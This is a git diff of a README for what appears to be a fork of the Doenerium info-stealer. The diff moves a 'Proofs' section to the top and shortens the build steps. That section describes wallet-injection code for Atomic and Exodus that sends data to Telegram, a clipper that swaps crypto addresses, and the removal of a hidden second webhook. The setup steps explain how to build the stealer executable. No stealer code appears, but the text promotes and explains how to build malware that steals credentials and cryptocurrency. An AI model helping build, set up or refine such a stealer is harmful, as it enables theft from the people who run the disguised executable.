@@ -1,6 +1,6 @@
 <a id="top"></a>
 <h1 align="center">
-Fuck Doenerium6969 ! 🖕
+Fuck Doenerium69 ! 🖕
 </h1>
 <br>
 <p align="center"> 
@@ -18,30 +18,54 @@ Fuck Doenerium6969 ! 🖕
 </p>
 <br>
 
-<p>I will show the evidence tonight or tomorrow if you want to keep it go to the "proofs" folder</p>
+<p>I am changing the readme to better explain</p>
 
 <b>🌐 〢 Content</b>
 
+- [🔮 Proofs](#proofs)
 - [📁 Setting up](#setup)
 - [⚔️ Features](#features)
 - [📸 Screenshots](#screenshot)
-- [🔮 Proofs](#proofs)
 - [📝 Todo](#todo)
 - [📜 License](#license)
 - [⚠️ Note](#note)
 
+
+<b><a id="proofs">🔮 〢 Proofs</a></b>
+
+<p><b>The code only works if you have Steam Game installed</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/work_only_if_you_have_steam_in_your_computer.png" width="720" height="360"> 
+
+<p><b>Old Atomic code (Dualhooked)</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/atomic_wallet_dualhook_screenshot_proof.png" width="720" height="360"> 
+<p><b>Old Exodus code (Dualhooked)</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/exodus_wallet_dualhook_screenshot_proof.png" width="720" height="360">
+
+<p><b>New Atomic code (send to Telegram)</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_atomic_injection_code.png" width="720" height="360"> 
+<p><b>New Exodus code (send to Telegram)</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_exodus_injection_code.png" width="720" height="360">
+
+<p><b>Old clipper addresses</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/old_crypto_addresses.png" width="720" height="360">
+<p><b>New clipper addresses</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/replace_crypto_address.png" width="720" height="360">
+
+<p><b>In the old code it sends information to 2 Webhooks out of 10 functions in the source code</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/send_to_2_webhook_in_10_fonctions.png" width="720" height="360">
+<p><b>But in the new one I removed the second Webhook</b></p>
+<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_1_webhook_code_remade.png" width="720" height="360">
+
 <b><a id="setup">📁  〢 Setting Up</a></b>
 
 ```
-1. Install "https://nodejs.org/en/download/prebuilt-installer/current" IMPORTANT: Install NodeJS with Tools for Native Modules
+1. Install NodeJS with tools for Native Modules "https://nodejs.org/en/download/prebuilt-installer/current"
 
-2. When installing Node.js also install "Tools for Native Modules" => Tick Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.
+2. Run the `install.bat` file to install all necessary packages and `start.bat` to start building.
 
-3. First run the `install.bat` file to install all necessary packages and `start.bat`.
+3. After the build, click "Ressources" to choose an icon for your executable.
 
-4. After the build, click "Ressources" to choose an icon for your executable.
-
-5. The filetype must be ".ico" and the icon should be (16x16px, 32x32px, 64x64px, 128x128px, 256x256px)
+4. The filetype must be ".ico" and the icon should be (16x16px, 32x32px, 64x64px, 128x128px, 256x256px)
 ```
 
 <b><a id="features">⚔️ 〢 Features</a></b>
@@ -100,30 +124,6 @@ Fuck Doenerium6969 ! 🖕
 <img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218385666837319803/Screenshot_13.png?ex=67239453&is=672242d3&hm=cc7acae4df8270e762452879dd2ea13ad4343dcd2e662a7c26601a6f2e39e071&" alt="" width="720" height="360">
 <img title="" src="https://cdn.discordapp.com/attachments/660885288079589385/1206900306638540830/Screenshot_6.png?ex=6723fbc0&is=6722aa40&hm=8a351f366943c014ba070cd03a6088fe8f454892a0e5c59d6fb828e7ae6b4aba&" alt="" width="720" height="360">
 
-<b><a id="proofs">🔮 〢 Proofs</a></b>
-
-<p><b>The code only works if you have Steam Game installed</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/work_only_if_you_have_steam_in_your_computer.png" width="720" height="360"> 
-
-<p><b>Old Atomic code (Dualhooked)</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/atomic_wallet_dualhook_screenshot_proof.png" width="720" height="360"> 
-<p><b>Old Exodus code (Dualhooked)</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/exodus_wallet_dualhook_screenshot_proof.png" width="720" height="360">
-
-<p><b>New Atomic code (send to Telegram)</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_atomic_injection_code.png" width="720" height="360"> 
-<p><b>New Exodus code (send to Telegram)</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_exodus_injection_code.png" width="720" height="360">
-
-<p><b>Old clipper addresses</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/old_crypto_addresses.png" width="720" height="360">
-<p><b>New clipper addresses</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/replace_crypto_address.png" width="720" height="360">
-
-<p><b>In the old code it sends information to 2 Webhooks out of 10 functions in the source code</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/send_to_2_webhook_in_10_fonctions.png" width="720" height="360">
-<p><b>But in the new one I removed the second Webhook</b></p>
-<img src="https://github.com/JohnDoe287/doenerium9696/blob/main/proofs/new_1_webhook_code_remade.png" width="720" height="360">
 
 <b><a id="todo">📝 〢 Todo</a></b>
 
